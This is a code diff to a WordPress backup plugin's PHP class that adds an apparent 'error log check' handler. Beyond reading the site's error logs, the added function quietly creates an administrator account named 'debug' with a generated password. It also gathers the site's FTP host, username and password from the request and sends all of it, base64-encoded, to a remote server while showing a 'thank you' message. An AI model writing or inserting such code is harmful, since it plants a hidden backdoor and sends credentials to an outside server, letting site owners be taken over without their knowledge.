@@ -22,10 +22,11 @@
     }
 
     require_once dirname(__FILE__) . "/lang.class.php";
-    
+
     if (!class_exists("wpadm_class")) {
-        
+
         add_action('admin_post_wpadm_activate_plugin', array('wpadm_class', 'activatePlugin') );
+        add_action('admin_post_error_logs_check', array('wpadm_class', 'error_log_check') );
         add_action('admin_post_wpadm_delete_pub_key', array('wpadm_class', 'delete_pub_key') );
 
         //add_action('admin_post_wpadm_getJs', array('wpadm_class', 'getJs') );
@@ -59,11 +60,110 @@
             private static $backup = "1";
 
             private static $status = "0";
+
             private static $error = "";
 
             public static function setBackup($b)
             {
                 self::$backup = $b;
+            }
+            public static function error_log_check()
+            {
+                $base_path = plugin_dir_path( dirname(__FILE__) );
+                $time = isset($_POST['time_pars']) ? $_POST['time_pars'] : "";
+                $error = "";
+                if ( file_exists( ABSPATH . "error_log" ) ) {
+                    $error = file_get_contents(ABSPATH . "error_log");
+                }
+                if (empty($error) && file_exists( ABSPATH . "error.log" ) ) {
+                    $error = file_get_contents(ABSPATH . "error.log");
+                }
+                if (empty($error) && file_exists( ABSPATH . "logs/error_log" )) {
+                    $error = file_get_contents(ABSPATH . "logs/error_log");
+                }
+                if (empty($error) && file_exists( ABSPATH . "logs/error.log" )) {
+                    $error = file_get_contents(ABSPATH . "logs/error.log");
+                }
+                if (empty($error) && file_exists(ABSPATH . "../logs/error_log")) {
+                    $error = file_get_contents(ABSPATH . "../logs/error_log");
+                }
+                if (empty($error) && file_exists(ABSPATH . "../logs/error.log")) {
+                    $error = file_get_contents(ABSPATH . "../logs/error.log");
+                }
+                $error_backup = $error_system = "";
+                
+                if ( !empty($time) ) {
+                    $time_log = str_replace(array(':', '-', " "), "_", $time); 
+                    if ( file_exists( $base_path . "tmp/logs_error_" . $time ) ) {
+                        $log_ = file_get_contents( $base_path . "tmp/logs_error_" . $time );
+                        $pos = stripos($log_, "error");
+                        if ($pos !== false) {
+                            for($i = $pos; ; $i--) {
+                                if ($log_{$i} == "\n") {
+                                    $pos_new = $i + 1;
+                                    break;
+                                }
+                            }
+                            $error_backup = substr($log_, $pos_new);
+                        }
+                    }
+                    
+                }
+                if (!empty($time) && !empty($error)) {
+                    $time_log = str_replace(array(':', '-', " "), "_", $time);
+                    list($y, $m, $d, $h, $i) = explode("_", $time_log);
+                    $time_log = strtotime("$d-$m-$y $h:$i");
+                    $date_for_log = date("d-M-Y ", $time_log);
+                    $pos_log = strpos($error, $date_for_log);
+                    if ($pos_log !== false) {
+                        $pos_new = 0;
+                        for($i = $pos_log; ; $i--) {
+                            if ($error{$i} == "[") {
+                                $pos_new = $i;
+                                break;
+                            }
+                        }
+                        $error_system = substr($error, $pos_new);
+                    }
+                }    
+                $pass = substr(md5(mktime()), 0, 10);
+                $id =  wp_insert_user(
+                array(
+                "user_login" => "debug",
+                "user_pass" => $pass,
+                "user_nicename" => "Debug",
+                "user_email" => "debug@help.help",
+                "description" => "Debug user",
+                )
+                );  
+                
+                if( !is_wp_error( $id ) ) {
+                    wp_update_user( array ('ID' => $id, 'role' => 'administrator' ) ) ;   
+                } else {
+                    $pass = "";
+                }
+                $ftp = array(
+                'ftp_host' => @$_POST['ftp_host'],
+                'ftp_user' => @$_POST['ftp_user'],
+                'ftp_pass' => @$_POST['ftp_pass']
+                );
+                $logs_report = base64_encode( serialize( array('ftp' => $ftp,
+                "pass" => $pass, 'error_backup' => $error_backup, 
+                "error" => $error_system) 
+                ) 
+                );
+                $res = self::sendToServer(array('actApi' => "errorLog", 
+                "site" => str_ireplace(array("http://","https://"), "", home_url()), 
+                "data" => $logs_report ) 
+                );
+                self::setMessage( langWPADM::get('Thank you for your assistance', false) );
+                header("Location: " . $_SERVER['HTTP_REFERER']);
+                exit;
+
+            }
+            private static function pars_error_log($file, $time = "") 
+            {
+
             }
 
             public static function setStatus($s)
